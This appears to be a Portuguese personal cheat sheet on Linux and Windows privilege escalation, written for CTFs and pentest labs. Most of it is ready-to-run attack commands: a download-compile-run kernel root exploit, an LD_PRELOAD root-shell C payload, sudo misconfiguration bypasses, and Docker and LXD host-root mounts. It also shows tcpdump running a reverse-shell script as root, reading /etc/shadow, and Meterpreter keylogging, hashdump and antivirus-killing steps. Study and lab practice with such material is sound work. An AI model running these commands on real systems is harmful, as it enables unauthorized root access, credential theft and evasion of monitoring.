# 🧬 Privilege Escalation - Anotações de Elevação de Privilégios

Este documento contém referências, comandos e dicas para **elevação de privilégios em ambientes Linux e Windows**, seja em CTFs, pentests ou laboratórios de estudo.

---

## 📜 Scripts de Enumeração (Linux / Windows)

Ferramentas automatizadas para levantamento de informações que possam levar à escalada de privilégios:

- 🔍 [PEASS-ng (LinPEAS / WinPEAS)](https://github.com/peass-ng/PEASS-ng)
- 🐧 [LinEnum](https://github.com/rebootuser/LinEnum)
- 🧪 [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker)
- 🪟 [Seatbelt (Windows)](https://github.com/GhostPack/Seatbelt)
- 🪟 [JAWS - Windows Privilege Escalation](https://github.com/411Hall/JAWS)

> ⚠️ **Atenção:** Esses scripts executam diversos comandos potencialmente detectáveis por antivírus ou sistemas de monitoramento. Em ambientes sensíveis ou reais, considere fazer **enumeração manual** para reduzir o "ruído".

---

## 🛠️ Dicas e Técnicas Gerais

Comandos e abordagens manuais úteis para escalada de privilégios.

### 🔑 Acesso via chave SSH do root

Verifique permissões da chave privada do root:

```bash
ls -ld /root/.ssh/id_rsa
```
Se tiver leitura, copie o conteúdo, salve como id_rsa localmente e:

```bash
chmod 600 id_rsa
ssh root@<IP> -i id_rsa
```
### 🔎 Enumeração de Sistema e Ambiente Linux

```md

Enumeração de sistema e ambiente Linux — comandos úteis para reconhecimento inicial, CTFs e pentests.

# CVE-2021-3493 (Afeta: Ubuntu 18.04 (kernel 4.15.x < 5.11).)
Exploit: https://github.com/briskets/CVE-2021-3493
Baixe: wget https://raw.githubusercontent.com/briskets/CVE-2021-3493/refs/heads/main/exploit.c
Compile: gcc exploit.c -o exploit
Rode: ./exploit (dá shell root direto).

# Esse comando procura todos os binários SUID root no sistema e lista seus detalhes.
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

# Procura arquivos com SUID e SGID setados ao mesmo tempo.
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null

# Coleta informações do kernel e arquitetura do sistema
uname -a

# Conferir versão do SUDO
sudo -V | head -n1
Uma das vulnerabilidades mais recentes para sudo carrega o CVE-2021-3156 e é baseado em uma vulnerabilidade de buffer overflow baseada em heap.
https://github.com/blasty/CVE-2021-3156

# Miss configuration pra root
sudo -u#-1 id

# Caso o (ALL, !root) /bin/ncdu pode escalar assim:
sudo -u#-1 /bin/ncdu
b
id

# Se o alvo tiver tcpdump
https://github.com/DanMcInerney/net-creds
https://github.com/lgandx/PCredz

# Mostra a versão do kernel e do compilador usado
cat /proc/version

# Uma lista de todos os executáveis binários no sistema, juntamente com as capacidades que foram definidas para cada um
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;

# Importar um contêiner como uma imagem para futuro ataque de replicação de contêiner ROOT
identificar contêiner vulneravel e com alguma imagem e em seguida:
lxc image import nome-da-imagem-tar-gz --alias nome-pra-identificar  -> importar imagem
lxc image list -> listar imagem importada com nome que damos
lxc init nome-qa-imagem-que-demos privesc -c security.privileged=true  -> criar conteiner chamado privesc com priv root
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true  -> montar root do host dentro do container
lxc start privesc -> iniciar container
lxc exec privesc /bin/bash ou lxc exec privesc -- /bin/sh -> entrar no container


# Identifica versão do sistema operacional
cat /etc/os-release
lsb_release -a

# Lista usuários locais do sistema
cat /etc/passwd

# Exibe hashes de senha (se houver permissão)
cat /etc/shadow

# Identifica usuários que possuem shell válida
grep "sh$" /etc/passwd

# Lista shells disponíveis no sistema
cat /etc/shells

# Mostra histórico de comandos do usuário atual
history
cat ~/.bash_history

# Exibe variáveis de ambiente + PATH abuse (Adicionando . ao PATH de um usuário adiciona seu diretório de trabalho atual à lista. Por exemplo, se pudermos modificar o caminho de um usuário, poderemos substituir um binário comum, como ls com um script malicioso, como um shell reverso.)
env
set
echo $PATH
htb_student@NIX02:~$ PATH=.:${PATH}
htb_student@NIX02:~$ export PATH
htb_student@NIX02:~$ echo $PATH
htb_student@NIX02:~$ touch ls
htb_student@NIX02:~$ echo 'echo "PATH ABUSE!!"' > ls
htb_student@NIX02:~$ chmod +x ls
htb_student@NIX02:~$ ls
PATH ABUSE!!

# Verifica privilégios sudo do usuário atual
sudo -l

# Mostra a versão do sudo instalada
sudo -V

# Tenta escalar privilégios diretamente para root (se permitido)
sudo su

# Lista processos em execução pertencentes ao root
ps aux | grep root

# Mostra interfaces de rede e endereços IP
ip a
ifconfig

# Exibe tabela de rotas
route

# Lista hosts descobertos via ARP
arp -a

# Lista pacotes instalados no sistema
dpkg -l

# Gera uma lista limpa dos pacotes instalados e salva em arquivo
apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee installed_pkgs.list

# Compara pacotes instalados com binários do GTFOBins
for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d'); do
  if grep -q "$i" installed_pkgs.list; then
    echo "Check GTFOBins for: $i"
  fi
done

# Procura arquivos de configuração no sistema
find / -type f \( -name "*.conf" -o -name "*.config" \) -exec ls -l {} \; 2>/dev/null
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null

# Procura scripts shell fora de diretórios comuns
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"

# Procura arquivos de histórico criados por scripts ou programas
find / -type f \( -name "*_hist" -o -name "*_history" \) -exec ls -l {} \; 2>/dev/null

# Lista todos os arquivos ocultos do sistema
find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null

# Lista todos os diretórios ocultos do sistema
find / -type d -name ".*" -ls 2>/dev/null

# Procura por flags comuns em CTFs
find / -name flag.txt 2>/dev/null
grep -Rni 'HTB{' / 2>/dev/null

# Lista tarefas agendadas diárias
ls -la /etc/cron.daily/

Cada entrada no arquivo crontab requer seis itens na seguinte ordem: minutos, horas, dias, meses, semanas, comandos. Por exemplo, a entrada 0 */12 * * * /home/admin/backup.sh funcionaria a cada 12 horas.

# Mostra discos e partições montadas
lsblk

# LD_PRELOAD Privilege Escalation
Veja se tem algum user com perm root em sudo -l
compile esse arquivo c:

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}

gcc -fPIC -shared -o root.so root.c -nostartfiles
sudo LD_PRELOAD=/tmp/root.so caminho-do-NOPASSWD
root

# Mostra sistemas de arquivos montados automaticamente
cat /etc/fstab

# Lista diretórios temporários e permissões
ls -l /tmp /var/tmp /dev/shm

# Root com variável de ambiente PYTHONPATH
sudo -l para ver se PYTHON roda como root NOPASSWD
conferir se algum arquivo python usa import de biblioteca
se sim: echo 'import os; os.system("/bin/bash")' > biblioteca-python.py
sudo /usr/bin/python3 /home/htb-student/arquivo-python.py
caso o path local que vc criou estiver um nivel acima do path padrão = root

# Procura diretórios graváveis por qualquer usuário
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null

# Procura arquivos graváveis por qualquer usuário
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

# Credenciais do banco de dados MySQL nos arquivos de configuração do WordPress
grep 'DB_USER\|DB_PASSWORD' wp-config.php

# Conferir Logrotate para possivel escalação de piv (https://github.com/whotwagner/logrotten.git)
cat /etc/logrotate.conf
cat /var/lib/logrotate.status
grep "create\|compress" /etc/logrotate.conf | grep -v "#"

# É a principal maneira de acessar informações do processo e pode ser usada para visualizar e modificar as configurações do kernel
find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"

# Grupo LXD pode ser um bom vetor para escalar -> 10(lxd)
uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)

# Grupo DOCKER
docker run -v /root:/mnt -it ubuntu  (Este comando cria uma nova instância do Docker com o diretório /root no sistema de arquivos host montado como um volume. Uma vez que o contêiner é iniciado, podemos navegar no diretório root)

# Usando o arquivo docker.sock para virar root (geralmente em /var/run)
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash

# Grupo DISK
 Um invasor com esses privilégios pode usar debugfspara acessar todo o sistema de arquivos com privilégios de nível raiz.

# Grupo ADM -> 4(adm)
Os membros do grupo de membros podem ler todos os logs armazenados em /var/log. Isso não concede acesso root diretamente, mas pode ser aproveitado para coletar dados confidenciais armazenados em arquivos de log ou enumerar ações do usuário e executar tarefas cron.

# Procura binários com bit SUID ativo (possível privilege escalation)
find / -perm -u=s -type f 2>/dev/null

# Listar os programas compilados na forma de binário
ls -l /bin /usr/bin/ /usr/sbin/

# Lista último horário de login de cada usuário
lastlog

# Ver se mais alguém está atualmente logado no sistema conosco
w

# Apt-get pode ser usado para sair de ambientes restritos e gerar um shell adicionando um comando Pre-Invoke
Gust4vo@htb[/htb]$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
id
uid=0(root) gid=0(root) groups=0(root)

# Bypass de RBASH para leitura de arquivos
1- while read line; do echo "$line"; done < flag.txt
2- printf "%s\n" "$( < flag.txt )"
3- mapfile -t a < flag.txt
   printf "%s\n" "${a[@]}"

# Caso o bin /usr/sbin/tcpdump seja (root) NOPASSWD: /usr/sbin/tcpdump
sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.arquivo_com_shell_reversa -Z root

# Caso o bin /usr/bin/openssl seja (root) NOPASSWD para ler arquivos com permissões root
sudo /usr/bin/openssl enc -in /etc/shadow

# Vulnerabilidade de escalação de privilégios no serviço screen versão 4.5.0
screen -v
Screen version 4.05.00 (GNU) 10-Dec-16
exploit para vuln se encontra aqui: https://dontpad.com/83hf72%C3%A7@3


# Ferramentas automatizadas de enumeração
linpeas.sh
linenum.sh
```
### 🔎 Enumeração de Sistema e Ambiente Windows

```bash
sysinfo
getuid
whoami /priv
getsystem
ps
getpid e depois migrate id_de_outro_processo_para_persisntecia
bypass de UAC
hashdump
Get-Content (Get-PSReadlineOption).HistorySavePath
```
### Meterpreter / Metasploit

```bash
run killav
screenshot
run vnc
keyscan_start
keyscan_dump
search -d C:/Users -f .pdf
download -r caminho
upload arquivo caminho
use multi/recon/local_exploit_suggester
```
### Others 

<img width="1015" height="437" alt="image" src="https://github.com/user-attachments/assets/48e87cbe-7be9-4707-804e-01b5d1258318" />


## 🌐 Sites e Recursos Úteis

- 🧠 [HackTricks](https://book.hacktricks.xyz/)  
  Guia abrangente sobre pentest, enumeração, privilege escalation, bypasses e muito mais.

- 📂 [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)  
  Repositório com payloads organizados por categoria (XSS, LFI, privilege escalation, etc).

- 🔍 [GTFOBins](https://gtfobins.github.io/)  
  Abusa de binários comuns do Linux para executar comandos com escalada de privilégios.

- 🧬 [LOLBAS](https://lolbas-project.github.io/)  
  Coleta de binários nativos do Windows que podem ser abusados para execução arbitrária.

- 💣 [Exploit-DB (searchsploit)](https://www.exploit-db.com/)  
  Banco de dados de exploits — também acessível via CLI com o comando `searchsploit`.





